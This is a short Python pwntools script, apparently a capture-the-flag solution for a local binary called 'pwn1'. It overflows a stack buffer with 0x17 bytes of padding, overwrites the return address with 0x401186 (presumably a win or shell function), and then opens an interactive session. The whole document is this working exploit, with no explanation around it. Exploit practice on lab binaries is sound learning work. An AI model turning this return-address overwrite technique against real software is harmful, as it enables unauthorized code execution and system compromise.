
from pwn import *

context(log_level='debug')

io=process("./pwn1")

io.recv()
fun=0x401186
payload=b'A'*(0xf+0x8)+p64(fun)

io.send(payload)

io.recv()

io.interactive()



